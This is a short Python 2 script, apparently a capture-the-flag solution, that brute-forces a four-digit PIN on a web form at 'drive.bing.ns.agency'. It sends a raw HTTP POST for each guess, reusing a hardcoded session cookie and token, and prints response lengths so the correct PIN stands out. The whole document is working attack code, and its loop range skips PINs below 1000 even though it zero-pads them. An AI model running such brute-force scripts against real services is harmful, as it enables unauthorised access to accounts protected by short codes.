import socket

post = """POST /[redacted] HTTP/1.1\r
Host: drive.bing.ns.agency\r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Referer: http://drive.bing.ns.agency/[redacted]\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 8\r
Connection: close\r
Cookie: zid=z5[redacted]15; token=d27db61951f4b06a486[redacted]51faca1b9b33aa2f894d; session=eyJyb2xlIjoi[redacted]kbWluIn0.D23txA.QhfxgomAQagDs4uQP9UKQEPOcDA\r
Upgrade-Insecure-Requests: 1\r\n\r
pin="""

for pin in range(1000, 9999):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(("drive.bing.ns.agency", 80))
	pin = str(pin)
	pin = "0" * (4 - len(pin)) + pin
	req = post + pin
	sock.send(req)
	relen = 1
	resp = ""
	while relen:
		data = sock.recv(4096)
		relen = len(data)
		resp += data
		if relen < 4096:
			break
	print pin + " - " + str(len(resp))
	#print req
	#print resp
	sock.close()
